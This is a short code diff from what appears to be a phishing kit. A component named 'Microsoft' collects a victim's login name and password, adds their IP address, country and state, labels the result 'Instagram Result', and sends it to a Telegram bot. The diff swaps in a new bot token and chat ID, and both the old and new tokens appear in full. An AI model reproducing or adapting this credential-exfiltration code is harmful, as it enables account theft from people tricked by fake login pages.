@@ -23,8 +23,8 @@ export default function Microsoft() {
                 var PasswordLogin = formData.password;
                 var SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-                var token = "6986854895:AAGyBEUhIFcSqaNmOrBMjpQigzVMZpMO38g";
-                var chat_id = -4688204488;
+        var token = "8164337614:AAHDsQAqR39tVrVJlKb9aKZxk1G9sxufQGM";
+        var chat_id = -4864993943;
                 var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
                 let api = new XMLHttpRequest();
